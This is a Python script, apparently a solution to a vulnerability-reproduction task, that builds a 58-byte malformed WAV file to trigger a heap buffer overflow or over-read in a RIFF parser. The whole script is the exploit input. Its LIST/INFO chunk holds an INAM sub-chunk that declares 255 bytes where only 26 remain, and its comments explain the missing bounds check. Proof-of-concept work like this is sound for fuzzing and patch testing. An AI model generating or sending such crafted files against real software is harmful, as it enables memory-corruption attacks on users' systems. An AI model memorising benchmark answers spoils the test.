import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is a heap buffer overflow (or over-read) in a RIFF parser.
        # It typically occurs when a sub-chunk's size exceeds the remaining data in the 
        # parent chunk (e.g., a LIST chunk), and the parser fails to validate this boundary.
        # We construct a 58-byte WAV file with a LIST chunk that contains an INFO sub-chunk
        # with a declared size larger than the available data.

        # 1. RIFF Header (12 bytes)
        # File size: 58 bytes. RIFF Chunk Size = 58 - 8 = 50.
        riff_header = b'RIFF' + struct.pack('<I', 50) + b'WAVE'

        # 2. LIST Chunk Header (8 bytes)
        # We set the LIST chunk size to 38, which consumes the rest of the file.
        # 58 (total) - 12 (RIFF) - 8 (LIST header) = 38 bytes.
        list_header = b'LIST' + struct.pack('<I', 38)

        # 3. LIST Chunk Payload (38 bytes)
        # The payload contains the type 'INFO', followed by a sub-chunk 'INAM'.
        # 'INFO' takes 4 bytes.
        # 'INAM' header takes 8 bytes (4 ID + 4 Size).
        # This leaves 38 - 4 - 8 = 26 bytes for the 'INAM' data.
        
        # To trigger the vulnerability, we set the 'INAM' size to be larger than 26.
        # We use 255 (0xFF).
        
        list_type = b'INFO'
        sub_chunk_id = b'INAM'
        sub_chunk_size = struct.pack('<I', 255) # Malformed size triggering overflow
        
        # We fill the actual 26 bytes of available space with padding.
        padding = b'A' * 26

        return riff_header + list_header + list_type + sub_chunk_id + sub_chunk_size + padding